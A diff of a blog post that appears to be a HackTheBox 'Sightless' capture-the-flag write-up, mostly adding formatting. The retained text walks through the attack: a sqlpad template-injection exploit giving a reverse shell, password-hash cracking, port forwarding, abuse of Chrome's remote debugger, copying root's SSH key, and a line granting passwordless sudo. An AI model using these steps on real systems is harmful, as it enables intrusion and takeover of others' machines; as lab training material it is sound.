@@ -3,10 +3,10 @@ title: Sightless
 date: 2025-01-11 07:20:00 -5000
 categories: [HTB, Easy, Linux]
 tags: [Web, Vulnerability Assessment, Lateral Movement, Chrome Debugging Tool, nginx enumeration, Command Injection, Reconnaissance]
+image:
+  path: /Assets/Pictures/Sightless/resized.webp
+  lqip: data:image/webp
 ---
-# Sightless (HTB Easy)
-
-![sightless](/Assets/Pictures/Sightless/icon.png)
 
 Sightless is a Linux box on the platform [HackTheBox](https://app.hackthebox.com/machines/624), created by [EmSec](https://app.hackthebox.com/users/962022). 
 
@@ -23,6 +23,8 @@ PORT   STATE SERVICE REASON         VERSION
 80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+{: .nolineno }
+
 Let's get more details about these ports using `-sVC` for services and default scripts scan.
 `nmap -Pn -sVC -p21,22,80 -vv -T4 $IP`
 Here is the result of the scan:
@@ -47,6 +49,8 @@ PORT   STATE SERVICE REASON  VERSION
 |_http-title: Sightless.htb
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+{: .nolineno }
+
 At this point we know where to start our extended enumeration.
 
 ### Port Enumeration
@@ -60,6 +64,8 @@ First as mentioned in the scan, we need to add the website to our `hosts` file, 
 ```bash
 echo -e "$IP\t\tsightless.htb" >> /etc/hosts
 ```
+{: .nolineno }
+
 Here is the website:
 
 ![website](/Assets/Pictures/Sightless/image.png)
@@ -79,15 +85,18 @@ A quick search on the internet revealed that the version `6.10.0` is vulnerable 
 ## Foothold & User
 Exploiting this CVE, should give us a reverse shell inside the machine. [Here](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944/blob/main/exploit.py) is the exploit script. 
 As described [here](https://nvd.nist.gov/vuln/detail/CVE-2022-0944):
+
 > NOTE:
 >
 >Template injection in connection test endpoint leads to RCE in GitHub repository sqlpad/sqlpad prior to 6.10.1.
+{: .prompt-tip }
 
 Exploiting the vulnerability, we got a reverse shell executing the command below:   
 
 ```bash
 python3 exploit-sqlpad.py http://sqlpad.sightless.htb/ 10.10.X.X 9999
 ```
+{: .nolineno }
 
 We landed as `root` as shown below, inside a docker container. We then  uploaded and ran `linpeas.sh`, which will give us a lot of information about the machine and eventually lateral and horizontal privilege escalation attack vectors.
 
@@ -102,12 +111,15 @@ Cracking this hash using `john`, revealed the password of `michael`.
 ```bash
 john -w=/usr/share/wordlists/rockyou.txt hashes.txt
 ```
+{: .nolineno }
 
 Using that set of credentials, we access the sightless machine via `ssh`:
 
 ```bash
 ssh michael@sightless.htb
 ```
+{: .nolineno }
+
 The flag was found under the home directory of the user `michael`. With this flag and access, the only thing left to do was to look for an attack vector to escalate our privileges to `root`.
 
 ## Privilege Escalation
@@ -121,6 +133,7 @@ In (2) The port `8080` is open and running locally on the machine. Forwarding th
 ```bash
 ssh -L 8080:127.0.0.1:8080 michael@sightless.htb
 ```
+{: .nolineno }
 
 At first try it did not work. We ran `linpeas` which helped us show more than we could imagine, because as mentioned in the `/etc/nginx/sites-available/default` file, looking at `<VirtaulHost 127.0.0.1:8080>` it is mentioned that the `ServerName` and `ServerAlias` have both to be named `admin.sightless.htb`, as shown below:
 
@@ -131,6 +144,7 @@ So to access the forwarded port at `8080` we need to add the hostname `admin.sig
 ```bash
 127.0.0.1       localhost admin.sightless.htb
 ```
+{: .nolineno }
 
 This change gave us access to the `froxlor` admin panel.
 
@@ -163,12 +177,14 @@ tcp      LISTEN    0         151              127.0.0.1:mysql                0.0
 tcp      LISTEN    0         128                      *:ftp                        *:*                  
 tcp      LISTEN    0         128                   [::]:ssh                     [::]:* 
 ```
+{: .nolineno }
 
 To access the admin panel, and the chrome remote debugger interface, we ran ssh the following way:
 
 ```bash
 ssh michael@sightless.htb -L 8080:admin.sightless.htb:8080 -L 33363:127.0.0.1:33363 -L 3000:127.0.0.1:3000 -L 41129:127.0.0.1:41129 -L 33060:127.0.0.1:33060 -L 35705:127.0.0.1:35705
 ```
+{: .nolineno }
 
 Once done, inside our chrome browser, we opened the `admin.sightless.htb` page and after that we opened the `chrome://inspect/#devices`, were we configured the listener to `127.0.0.1:41129` as shown below:
 
@@ -194,9 +210,11 @@ From there we got three choices:
 1. reading the flag by copying it into the `/tmp` folder and then changing it permission with `chmod 644 /tmp/root.txt` to read the flag. 
 2. and also copying the `root` user's `/root/.ssh/id_rsa` key inside the `/tmp` folder, giving it `644` permission for us to extract it and then use it to log in using `ssh -i rood-id_rsa root@sightless.htb`
 3. Add michael to the `sudoers` file, so we can use `sudo su` as `michael` to get a root shell. We can do this by adding the following line to the `/etc/sudoers` file:
+
     ```bash
     echo "michael ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/michael
     ```
+    {: .nolineno }
 
 After doing the first option, we got the flag. 
 
